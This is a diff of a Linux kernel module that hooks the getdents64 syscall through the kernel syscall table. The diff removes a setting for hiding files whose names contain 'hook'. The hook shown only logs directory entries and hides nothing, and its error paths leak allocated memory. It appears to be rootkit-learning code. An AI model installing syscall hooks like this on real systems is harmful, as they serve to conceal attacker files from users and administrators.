@@ -8,58 +8,56 @@
 
 #include "my_memory.h"
 
-#define IGNORE_TEXT "hook"                      //<- Text on file/dir to hide. If a file contains this text, hides it
+static unsigned long *__sys_call_table;                             //<- Pointer to the Kernel syscall table
 
-static unsigned long *__sys_call_table;         //<- Pointer to the Kernel syscall table
-
-asmlinkage long (*original_getdents64) (const struct pt_regs *regs);  //<- Original getdents64 syscall definition
+asmlinkage long (*original_getdents64) (const struct pt_regs *regs);//<- Original getdents64 syscall definition
 
 asmlinkage int hooked_getdents64(const struct pt_regs *regs)
 {
-        struct linux_dirent64 __user * dirent = (struct linux_dirent64 *)regs->si;
-        long values;                                              //<- Will store results for error checking
-        struct linux_dirent64 * current_dir, * dirent_ker = NULL;
-        unsigned long offset = 0;                                 //<- Offset used to point to the next linux_dirent64
+        struct linux_dirent64 __user * dirent_user =                //<- dirent_user gets the pointer from RSI register
+                               (struct linux_dirent64 *)regs->si;
+        struct linux_dirent64 * dirent_ker = NULL;                  //<- The dirent in the kernel space
+        struct linux_dirent64 * dirent_current = NULL;              //<- Will point to the actual dirent
+        long values;                                                //<- Will store results for error checking
+        unsigned long offset = 0;                                   //<- Offset used to point to the next linux_dirent64
+        int size = 0;                                               //<- Stores the size of the dirent entries
 
-        int ret = original_getdents64(regs);                      //<- Call the original getdents64 to get the linux_direntry-es
-        if (ret <= 0) {                                           //<- Error checking
+        size = original_getdents64(regs);                           //<- Call the original getdents64 to get the linux_direntry-es
+        if (size <= 0) {
                 pr_err("   Error calling original getdents64.\n");
-                return ret;
+                return size;
         }
 
-        dirent_ker = kzalloc(ret, GFP_KERNEL);                    //<- Reserve memory to copy the returned linux_direntry-es from previous line
-        if (dirent_ker == NULL) {                                 //<- Error checking.
+        dirent_ker = kzalloc(size, GFP_KERNEL);                     //<- Reserve memory to copy the returned linux_direntry-es from previous line
+        if (dirent_ker == NULL) {                                   //<- Error checking.
                 pr_err("   Error allocating memory space.\n");
-                return ret;
+                return size;
         }
 
-        values = copy_from_user(dirent_ker, dirent, ret);         //<- Move from user space to kernel space
-        if (values) {                                             //<- Error checking
+        values = copy_from_user(dirent_ker, dirent_user, size);     //<- Move from user space to kernel space
+        if (values) {                                               //   dirent_kern will be a copy of the dirent_user
                 pr_err("   Error copying from user to kernel space.\n");
-                return ret;
+                return size;
         }
 
-        while (offset < ret)                                     //<- Loop while offset is not equal to direntries size
-        {
-                current_dir = (void *)dirent_ker + offset;       //<- We go increasing the value of current dir with
-                                                                 //   offset, to point to the next direntry
-                pr_info("   ENTRY: %s, size %d.\n", current_dir->d_name, current_dir->d_reclen);
-                
-                offset += current_dir->d_reclen;                 //<- Offset has to be increased by the size of the 
-                                                                 //   actual direntry
+        while (offset < size)                                       //<- Loop over all direntries. When offset reaches
+        {                                                           //   the total size, we are done
+                dirent_current = (void *)dirent_ker + offset;       //<- Current directory pints to next one. 
+                                                                    //   dirent_ker plus offset, points the right mem position
+                pr_info("   ENTRY: %s, size %d.\n", dirent_current->d_name, dirent_current->d_reclen);
+                offset += dirent_current->d_reclen;                 //<- Update the offset for the next dirent
         }
 
-        values = copy_to_user(dirent, dirent_ker, ret);          //<- Results go to UserSpace
+        values = copy_to_user(dirent_user, dirent_ker, size);       //<- Return to user space the dirent in kernel space
         if (values) {
                 pr_err("    Error copying from kernel to user space.\n");
-                return ret;
+                return size;
         }
 
-        kfree(dirent_ker);                                       //<- Release reserved Kernel Space
+        kfree(dirent_ker);                                          //<- Release memory
 
-        return ret;                                              //<- Return the size of all direntries
+        return size;
 }
-
 
 static int __init lkm_init(void)
 {
